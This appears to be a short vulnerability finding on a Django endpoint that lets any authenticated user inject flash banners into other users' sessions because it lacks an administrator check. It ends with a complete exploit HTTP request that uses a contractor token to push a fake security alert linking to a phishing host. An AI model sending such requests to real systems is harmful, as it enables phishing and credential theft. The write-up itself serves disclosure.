diagnosis: send_user_flash_banner allows injecting high-priority flash banner messages into target users' active browser sessions by iterating Django Session objects. While the view requires authentication, it fails to verify that request.user is an administrator with authority over target_user. An ordinary authenticated employee or customer can inject deceptive or spoofed security alerts into the active sessions of executives or other tenants.
exploit_request:
POST /api/support/inject-banner/ HTTP/1.1
Host: intranet.enterprisegroup.com
Authorization: Bearer contractor_jwt_12
Content-Type: application/json

{
  "user_id": 1,
  "message": "Security Alert: Please verify your credentials at http://attacker-phish.internal"
}
